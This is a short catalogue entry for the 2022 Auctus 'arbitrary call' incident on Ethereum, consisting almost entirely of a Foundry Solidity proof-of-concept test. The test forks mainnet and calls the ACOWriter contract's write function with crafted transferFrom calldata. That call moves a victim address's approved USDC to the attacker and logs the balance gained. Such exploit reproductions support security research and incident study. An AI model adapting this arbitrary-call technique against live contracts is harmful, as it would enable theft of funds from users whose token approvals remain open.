# [?] Auctus - Arbitrary Call

## Summary
Severity: Unknown
Chain: Ethereum
Component: Auctus
Published: 2022-03-26
Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-03/Auctus_exp.sol
Type: defi-exploit-poc

## Details
```solidity
contract ContractTest is Test, MockACOToken {
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
    IACOWriter acowrite = IACOWriter(payable(0xE7597F774fD0a15A617894dc39d45A28B97AFa4f));
    IERC20 usdc = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);

    function setUp() public {
        cheats.createSelectFork("mainnet", 14_460_635); // fork mainnet at block 14460635
    }

    function test() public {
        emit log_named_uint("Before exploit, USDC balance of attacker:", usdc.balanceOf(msg.sender));
        acowrite.write{value: 1}(
            address(this),
            1,
            address(usdc),
            abi.encodeWithSelector(
                bytes4(keccak256(bytes("transferFrom(address,address,uint256)"))),
                0xCB32033c498b54818e58270F341e5f6a3bce993B,
                msg.sender,
                usdc.balanceOf(0xCB32033c498b54818e58270F341e5f6a3bce993B)
            )
        );
        emit log_named_uint("After exploit, USDC balance of attacker:", usdc.balanceOf(msg.sender));
    }
}
```
